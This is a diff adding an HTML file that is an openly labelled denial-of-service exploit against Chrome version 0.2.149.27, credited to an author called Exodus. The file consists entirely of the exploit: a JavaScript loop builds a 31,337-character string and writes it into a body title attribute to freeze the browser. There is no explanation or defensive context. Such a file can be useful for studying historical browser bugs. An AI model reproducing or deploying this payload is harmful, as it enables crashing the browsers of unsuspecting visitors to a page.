@@ -1,0 +1,26 @@
+&lt;!-- 
+     Chrome(0.2.149.27) title attribute Denial of Service(Freeze) exploit
+     Exploit written by Exodus.
+     http://www.blackhat.org.il
+	 http://www.blackhat.org.il/index.php/ready-set-chrome/
+	 http://www.blackhat.org.il/exploits/chrome-freeze-exploit.html
+--&gt;
+&lt;HTML&gt;
+ &lt;HEAD&gt;
+  &lt;TITLE&gt; Chrome(0.2.149.27) title attribute Denial of Service(Freeze) exploit&lt;/TITLE&gt;
+   &lt;SCRIPT language=&quot;JavaScript&quot;&gt;
+   function buff(len)
+	{
+		var buffer;
+		 for(var i = 0; i != len; i++)
+		{ buffer += &#039;E&#039;;}
+		return buffer;
+	}
+&lt;/SCRIPT&gt;
+ &lt;/HEAD&gt;
+	&lt;SCRIPT&gt;
+		document.write(&#039;&lt;body title=\&quot;&#039; + buff(31337) + &#039;\&quot;&gt;&#039;);
+	&lt;/SCRIPT&gt;
+ &lt;/BODY&gt;
+
+&lt;/HTML&gt;
